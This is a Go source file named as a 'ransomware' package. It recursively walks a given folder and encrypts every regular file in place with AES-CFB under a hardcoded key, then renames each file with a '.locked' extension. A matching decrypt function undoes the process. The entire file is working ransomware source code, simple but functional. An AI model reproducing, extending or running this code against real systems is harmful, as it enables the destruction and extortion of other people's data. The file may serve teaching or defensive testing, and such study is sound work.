package ransomware

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
)

var (
	secret [32]byte = sha256.Sum256([]byte("abcabcbacasdfgads"))
)

func Run(action, filePath string) {
	pathInfo, err := os.Stat(filePath)
	if err != nil {
		log.Fatal("File or folder not found")
	}
	switch m := pathInfo.Mode(); {
	case m.IsDir():
		filepath.Walk(filePath, func(relativePath string, info os.FileInfo, err error) error {
			if info.Mode().IsRegular() {
				if action == "encrypt" {
					encrypt(relativePath)
				} else {
					decrypt(relativePath)
				}
			}
			return nil
		})
	case m.IsRegular():
		if action == "encrypt" {
			encrypt(filePath)
		} else {
			decrypt(filePath)
		}
	}
}

func encrypt(fileFullPath string) {
	fmt.Println("encrypting", fileFullPath)
	data, err := ioutil.ReadFile(fileFullPath)
	if err != nil {
		panic(err)
	}

	block, err := aes.NewCipher(secret[:])
	if err != nil {
		panic(err)
	}

	ciphertext := make([]byte, aes.BlockSize+len(data))
	fmt.Println("cipertext", fileFullPath)
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], data)
	fmt.Println("Writefile", fileFullPath)
	ioutil.WriteFile(fileFullPath, ciphertext, 0644)

	fmt.Println("Rename", fileFullPath)
	err = os.Rename(fileFullPath, fileFullPath+".locked")
	if err != nil {
		log.Fatal(err)
	}
}

func decrypt(fileFullPath string) {
	ciphertext, err := ioutil.ReadFile(fileFullPath)
	if err != nil {
		panic(err)
	}

	block, err := aes.NewCipher(secret[:])
	if err != nil {
		panic(err)
	}

	if len(ciphertext) < aes.BlockSize {
		panic("ciphertext too short")
	}

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)

	ioutil.WriteFile(fileFullPath, ciphertext, 0644)

	if strings.HasSuffix(fileFullPath, ".locked") {
		newFilePath := fileFullPath[:len(fileFullPath)-7]
		err = os.Rename(fileFullPath, newFilePath)
		if err != nil {
			log.Fatal(err)
		}
	}

}
